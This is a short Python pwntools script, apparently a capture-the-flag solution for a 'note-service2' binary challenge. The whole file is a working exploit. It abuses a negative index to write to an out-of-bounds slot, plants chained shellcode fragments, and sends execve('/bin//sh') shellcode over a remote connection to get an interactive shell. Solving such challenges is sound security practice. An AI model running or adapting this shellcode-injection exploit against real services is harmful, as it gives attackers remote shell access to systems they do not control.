#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./note-service2"
ENV = {"LD_PRELOAD":"./libc.so.6"}

#p = process(elf)
p = remote("49.4.23.66", 31430)

def add(idx, s):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("index:")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline("8")
    p.recvuntil("content:")
    p.send(s)

def delete(idx):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(idx))


add(-0x11, "\x58\x58\x58\x58\x00\x00\x00")
add(0x11, "\x48\x89\xfe\x48\xc7\xc7\x00")
add(0x11, "\xB8\x00\x00\x00\x00\x0F\x05")

delete(0x11)

payload = p8(0)*0x7
payload += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
payload += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline(payload)

p.interactive()
